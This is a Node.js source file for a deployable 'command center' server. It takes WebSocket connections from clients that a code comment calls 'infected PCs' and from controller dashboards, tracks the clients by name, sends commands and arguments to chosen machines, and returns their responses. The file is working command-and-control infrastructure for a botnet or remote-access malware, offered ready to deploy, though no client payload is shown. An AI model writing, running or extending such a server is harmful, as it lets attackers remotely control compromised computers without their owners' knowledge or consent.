// ========================================
//  COMMAND CENTER SERVER  — RENDER.COM READY
// ========================================

import express from "express";
import { WebSocketServer } from "ws";
import http from "http";
import path from "path";
import { fileURLToPath } from "url";

// Setup paths
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Express
const app = express();
app.use(express.json());

// Create & bind HTTP + WS
const server = http.createServer(app);

// ===============================
//   WEBSOCKETS
// ===============================
const wssClient = new WebSocketServer({ noServer: true });    // for clients (infected PCs)
const wssControl = new WebSocketServer({ noServer: true });   // for controllers (dashboard or CLI)

// Maps
// clientName → ws
const clientSockets = new Map();

// control sockets (there may be multiple)
const controlSockets = new Set();

// Helper: broadcast to all control panels
function sendToAllControllers(msg) {
    const json = JSON.stringify(msg);
    for (const ws of controlSockets) {
        try { ws.send(json); } catch {}
    }
}

// Helper: send to specific client
function sendToClient(target, msg) {
    const ws = clientSockets.get(target);
    if (ws && ws.readyState === ws.OPEN) {
        ws.send(JSON.stringify(msg));
        return true;
    }
    return false;
}

// ===============================
//   CLIENT WEBSOCKET HANDLING
// ===============================
wssClient.on("connection", (ws, req) => {
    let clientName = null;

    ws.on("message", raw => {
        let data;
        try { data = JSON.parse(raw); }
        catch { return; }

        // First message from a client MUST be a registration
        if (data.type === "register") {
            clientName = data.name;
            clientSockets.set(clientName, ws);
            console.log(`🟢 Client connected: ${clientName}`);

            sendToAllControllers({
                type: "client_status",
                client: clientName,
                online: true
            });
            return;
        }

        // Route client → control
        if (clientName) {
            sendToAllControllers({
                type: "client_response",
                client: clientName,
                payload: data
            });
        }
    });

    ws.on("close", () => {
        if (clientName) {
            clientSockets.delete(clientName);
            console.log(`🔴 Client disconnected: ${clientName}`);

            sendToAllControllers({
                type: "client_status",
                client: clientName,
                online: false
            });
        }
    });
});

// ===============================
//   CONTROL WEBSOCKET HANDLING
// ===============================
wssControl.on("connection", (ws, req) => {
    controlSockets.add(ws);

    console.log("🟡 Control connected");

    // Send list of online clients immediately
    for (const name of clientSockets.keys()) {
        ws.send(JSON.stringify({
            type: "client_status",
            client: name,
            online: true
        }));
    }

    ws.on("message", raw => {
        let data;
        try { data = JSON.parse(raw); }
        catch { return; }

        // Control → Client routing
        if (data.type === "command") {
            const ok = sendToClient(data.target, {
                type: "command",
                command: data.command,
                args: data.args || null
            });

            ws.send(JSON.stringify({
                type: "command_ack",
                success: ok,
                target: data.target,
                command: data.command
            }));
        }
    });

    ws.on("close", () => {
        controlSockets.delete(ws);
        console.log("🟡 Control disconnected");
    });
});

// ===============================
//  HTTP ROUTES (for dashboard files)
// ===============================
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

// ===============================
//  UPGRADE HANDLING
// ===============================
server.on("upgrade", (req, socket, head) => {
    const { url } = req;

    if (url === "/client-ws") {
        wssClient.handleUpgrade(req, socket, head, ws => {
            wssClient.emit("connection", ws, req);
        });
    } 
    else if (url === "/control-ws") {
        wssControl.handleUpgrade(req, socket, head, ws => {
            wssControl.emit("connection", ws, req);
        });
    }
    else {
        socket.destroy();
    }
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log("==================================");
    console.log(`🚀 SERVER READY on port ${PORT}`);
    console.log("Client WS:   wss://yourdomain/client-ws");
    console.log("Control WS:  wss://yourdomain/control-ws");
    console.log("Dashboard:   https://yourdomain/");
    console.log("==================================");
});
